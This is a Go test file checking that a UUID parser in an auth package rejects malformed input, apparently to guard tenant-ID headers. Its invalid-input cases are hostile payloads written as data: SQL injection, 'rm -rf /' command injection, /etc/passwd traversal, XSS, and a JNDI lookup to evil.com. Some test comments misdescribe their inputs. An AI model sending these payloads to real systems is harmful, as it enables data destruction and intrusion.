// SPDX-License-Identifier: Apache-2.0

package auth

import (
	"strings"
	"testing"

	"github.com/google/uuid"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

// TestParseUUID_ValidUUIDs tests parseUUID with valid UUID inputs
func TestParseUUID_ValidUUIDs(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected uuid.UUID
	}{
		{
			name:     "valid v4 UUID lowercase",
			input:    "f47ac10b-58cc-4372-a567-0e02b2c3d479",
			expected: uuid.MustParse("f47ac10b-58cc-4372-a567-0e02b2c3d479"),
		},
		{
			name:     "valid v4 UUID uppercase",
			input:    "F47AC10B-58CC-4372-A567-0E02B2C3D479",
			expected: uuid.MustParse("f47ac10b-58cc-4372-a567-0e02b2c3d479"),
		},
		{
			name:     "valid v4 UUID mixed case",
			input:    "F47ac10B-58CC-4372-a567-0E02b2c3d479",
			expected: uuid.MustParse("f47ac10b-58cc-4372-a567-0e02b2c3d479"),
		},
		{
			name:     "valid UUID with whitespace trimmed",
			input:    "  f47ac10b-58cc-4372-a567-0e02b2c3d479  ",
			expected: uuid.MustParse("f47ac10b-58cc-4372-a567-0e02b2c3d479"),
		},
		{
			name:     "valid UUID with tab characters trimmed",
			input:    "\tf47ac10b-58cc-4372-a567-0e02b2c3d479\t",
			expected: uuid.MustParse("f47ac10b-58cc-4372-a567-0e02b2c3d479"),
		},
		{
			name:     "valid UUID with newline trimmed",
			input:    "\nf47ac10b-58cc-4372-a567-0e02b2c3d479\n",
			expected: uuid.MustParse("f47ac10b-58cc-4372-a567-0e02b2c3d479"),
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result, err := parseUUID(tt.input)
			require.NoError(t, err, "parseUUID should not return error for valid UUID")
			assert.Equal(t, tt.expected, result, "parsed UUID should match expected value")
		})
	}
}

// TestParseUUID_InvalidInputs tests parseUUID with invalid inputs that should fail
func TestParseUUID_InvalidInputs(t *testing.T) {
	tests := []struct {
		name        string
		input       string
		errContains string
	}{
		{
			name:        "empty string",
			input:       "",
			errContains: "UUID cannot be empty",
		},
		{
			name:        "only whitespace",
			input:       "   ",
			errContains: "UUID cannot be empty",
		},
		{
			name:        "only tabs",
			input:       "\t\t\t",
			errContains: "UUID cannot be empty",
		},
		{
			name:        "only newlines",
			input:       "\n\n\n",
			errContains: "UUID cannot be empty",
		},
		{
			name:        "nil UUID (all zeros)",
			input:       "00000000-0000-0000-0000-000000000000",
			errContains: "UUID cannot be nil",
		},
		{
			name:        "wrong length - too short",
			input:       "f47ac10b-58cc-4372-a567-0e02b2c3d47",
			errContains: "invalid UUID format",
		},
		{
			name:        "wrong length - too long",
			input:       "f47ac10b-58cc-4372-a567-0e02b2c3d4799",
			errContains: "invalid UUID format",
		},
		// Note: google/uuid.Parse actually accepts UUID without hyphens
		// This is a valid format per the library implementation
		{
			name:        "wrong hyphen positions",
			input:       "f47ac10b58-cc-4372-a567-0e02b2c3d479",
			errContains: "invalid UUID format",
		},
		{
			name:        "invalid characters - special chars",
			input:       "f47ac10b-58cc-4372-a567-0e02b2c3d47!",
			errContains: "invalid UUID format",
		},
		{
			name:        "invalid characters - letters beyond f",
			input:       "g47ac10b-58cc-4372-a567-0e02b2c3d479",
			errContains: "invalid UUID format",
		},
		{
			name:        "SQL injection attempt - simple",
			input:       "' OR '1'='1",
			errContains: "invalid UUID format",
		},
		{
			name:        "SQL injection attempt - UNION",
			input:       "f47ac10b' UNION SELECT * FROM users--",
			errContains: "invalid UUID format",
		},
		{
			name:        "SQL injection attempt - 36 char payload",
			input:       "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
			errContains: "invalid UUID format",
		},
		{
			name:        "NoSQL injection attempt",
			input:       "{\"$ne\":null}",
			errContains: "invalid UUID format",
		},
		{
			name:        "path traversal attempt",
			input:       "../../../etc/passwd",
			errContains: "invalid UUID format",
		},
		{
			name:        "null byte injection",
			input:       "f47ac10b-58cc-4372-a567-0e02b2c3d479\x00",
			errContains: "invalid UUID format",
		},
		{
			name:        "URL encoded attempt",
			input:       "f47ac10b%2D58cc%2D4372%2Da567%2D0e02b2c3d479",
			errContains: "invalid UUID format",
		},
		{
			name:        "unicode normalization attack",
			input:       "f47ac10b\u2010\u205858cc\u20104372\u2010a567\u20100e02b2c3d479",
			errContains: "invalid UUID format",
		},
		{
			name:        "random text",
			input:       "not-a-uuid-at-all",
			errContains: "invalid UUID format",
		},
		{
			name:        "numeric string only",
			input:       "123456789012345678901234567890123456",
			errContains: "invalid UUID format",
		},
		// Note: google/uuid.Parse accepts braced and URN formats
		// These are valid per the library implementation
		{
			name:        "embedded whitespace",
			input:       "f47ac10b-58cc-4372 a567-0e02b2c3d479",
			errContains: "invalid UUID format",
		},
		{
			name:        "JavaScript payload",
			input:       "<script>alert('xss')</script>",
			errContains: "invalid UUID format",
		},
		{
			name:        "command injection attempt",
			input:       "f47ac10b; rm -rf /",
			errContains: "invalid UUID format",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result, err := parseUUID(tt.input)
			require.Error(t, err, "parseUUID should return error for invalid input")
			assert.Equal(t, uuid.Nil, result, "parseUUID should return nil UUID on error")
			assert.Contains(t, err.Error(), tt.errContains, "error message should contain expected text")
		})
	}
}

// TestParseUUID_EdgeCases tests edge cases and boundary conditions
func TestParseUUID_EdgeCases(t *testing.T) {
	t.Run("multiple consecutive whitespace", func(t *testing.T) {
		input := "    f47ac10b-58cc-4372-a567-0e02b2c3d479    "
		result, err := parseUUID(input)
		require.NoError(t, err)
		assert.NotEqual(t, uuid.Nil, result)
	})

	t.Run("mixed whitespace types", func(t *testing.T) {
		input := " \t\n f47ac10b-58cc-4372-a567-0e02b2c3d479 \n\t "
		result, err := parseUUID(input)
		require.NoError(t, err)
		assert.NotEqual(t, uuid.Nil, result)
	})

	t.Run("exactly 36 characters but invalid format", func(t *testing.T) {
		// This is the critical test - the old implementation would pass this!
		input := "123456789012345678901234567890123456"
		result, err := parseUUID(input)
		require.Error(t, err, "should reject 36-char non-UUID strings")
		assert.Equal(t, uuid.Nil, result)
	})

	t.Run("valid UUID concatenated with extra chars then truncated to 36", func(t *testing.T) {
		input := "f47ac10b-58cc-4372-a567-0e02b2c3" // exactly 36 chars but incomplete
		result, err := parseUUID(input)
		require.Error(t, err, "should reject incomplete UUID")
		assert.Equal(t, uuid.Nil, result)
	})
}

// TestParseUUID_RFCCompliance tests RFC 4122 compliance
func TestParseUUID_RFCCompliance(t *testing.T) {
	tests := []struct {
		name    string
		input   string
		version int
		valid   bool
	}{
		{
			name:    "valid UUID v1 (time-based)",
			input:   "c232ab00-9414-11ec-b3c8-9f6bdeced846",
			version: 1,
			valid:   true,
		},
		{
			name:    "valid UUID v4 (random)",
			input:   "f47ac10b-58cc-4372-a567-0e02b2c3d479",
			version: 4,
			valid:   true,
		},
		{
			name:    "valid UUID v5 (SHA-1 hash)",
			input:   "74738ff5-5367-5958-9aee-98fffdcd1876",
			version: 5,
			valid:   true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result, err := parseUUID(tt.input)
			if tt.valid {
				require.NoError(t, err)
				assert.NotEqual(t, uuid.Nil, result)
				// Verify version field (4 bits at position 13)
				assert.Equal(t, tt.version, int(result.Version()))
			} else {
				require.Error(t, err)
				assert.Equal(t, uuid.Nil, result)
			}
		})
	}
}

// BenchmarkParseUUID benchmarks the parseUUID function
func BenchmarkParseUUID(b *testing.B) {
	validUUID := "f47ac10b-58cc-4372-a567-0e02b2c3d479"
	invalidUUID := "invalid-uuid-string"

	b.Run("valid UUID", func(b *testing.B) {
		for i := 0; i < b.N; i++ {
			_, _ = parseUUID(validUUID)
		}
	})

	b.Run("invalid UUID", func(b *testing.B) {
		for i := 0; i < b.N; i++ {
			_, _ = parseUUID(invalidUUID)
		}
	})

	b.Run("empty string", func(b *testing.B) {
		for i := 0; i < b.N; i++ {
			_, _ = parseUUID("")
		}
	})

	b.Run("nil UUID", func(b *testing.B) {
		nilUUID := "00000000-0000-0000-0000-000000000000"
		for i := 0; i < b.N; i++ {
			_, _ = parseUUID(nilUUID)
		}
	})
}

// TestParseUUID_SecurityVulnerabilities tests specific security vulnerability scenarios
func TestParseUUID_SecurityVulnerabilities(t *testing.T) {
	t.Run("tenant isolation bypass attempt", func(t *testing.T) {
		// Attacker tries to bypass tenant isolation with crafted 36-char string
		maliciousPayloads := []string{
			"AAAAAAAA-AAAA-AAAA-AAAA-AAAAAAAAAAAA", // Not a valid UUID variant
			"ffffffff-ffff-ffff-ffff-ffffffffffff", // All F's - technically valid but suspicious
			strings.Repeat("A", 36),                // 36 A's - the critical test case
			strings.Repeat("1", 36),                // 36 1's
		}

		for _, payload := range maliciousPayloads {
			t.Run(payload[:20]+"...", func(t *testing.T) {
				result, err := parseUUID(payload)
				// Most should fail; some might be technically valid UUIDs
				// but we verify the function doesn't panic or return unexpected values
				if err == nil {
					// If it succeeded, it must be a valid UUID (not just any 36-char string)
					assert.NotEqual(t, uuid.Nil, result)
					// Verify it round-trips correctly
					parsed, parseErr := uuid.Parse(payload)
					require.NoError(t, parseErr)
					assert.Equal(t, parsed, result)
				} else {
					assert.Equal(t, uuid.Nil, result)
				}
			})
		}
	})

	t.Run("timing attack resistance", func(t *testing.T) {
		// Ensure function doesn't leak information via timing
		// Both invalid UUIDs should take similar time
		invalid1 := "invalid-short"
		invalid2 := "invalid-but-exactly-36-characters!!"

		// Run both several times and ensure no panic
		for i := 0; i < 100; i++ {
			_, err1 := parseUUID(invalid1)
			_, err2 := parseUUID(invalid2)
			assert.Error(t, err1)
			assert.Error(t, err2)
		}
	})

	t.Run("memory safety - no buffer overflow", func(t *testing.T) {
		// Test with very long strings to ensure no buffer overflow
		veryLongString := strings.Repeat("a", 1000)
		result, err := parseUUID(veryLongString)
		assert.Error(t, err)
		assert.Equal(t, uuid.Nil, result)
	})

	t.Run("injection via X-Tenant-ID header simulation", func(t *testing.T) {
		// Simulate actual attack vector through X-Tenant-ID header
		attackPayloads := []string{
			"'; DROP TABLE tenants; --",
			"1' OR '1'='1",
			"${jndi:ldap://evil.com/a}",
			"../../../etc/passwd",
			"%00%00%00%00%00%00%00%00%00%00%00%00",
		}

		for _, payload := range attackPayloads {
			result, err := parseUUID(payload)
			require.Error(t, err, "must reject injection payload: %s", payload)
			assert.Equal(t, uuid.Nil, result)
		}
	})
}
